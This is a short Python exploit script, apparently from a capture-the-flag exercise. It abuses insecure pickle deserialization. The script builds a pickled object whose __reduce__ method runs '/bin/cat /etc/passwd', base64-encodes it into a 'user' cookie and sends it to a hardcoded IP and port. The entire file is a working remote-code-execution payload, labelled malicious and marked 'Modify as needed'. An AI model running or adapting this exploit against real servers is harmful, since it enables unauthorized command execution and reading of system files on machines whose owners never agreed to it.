import requests
import base64
import pickle
import os
import subprocess

class DillPickle:
    def __reduce__(self):
        return (subprocess.check_output, (['/bin/cat', '/etc/passwd'],))  # Modify as needed

# Generate the malicious payload
payload = base64.b64encode(pickle.dumps(DillPickle())).decode()

# Define the cookies dictionary
cookies = {"user": payload}

# Target URL
url = "http://139.162.5.230:10292/"

# Send the request with the malicious cookie
response = requests.get(url, cookies=cookies)

# Print the server's response
print(response.text)
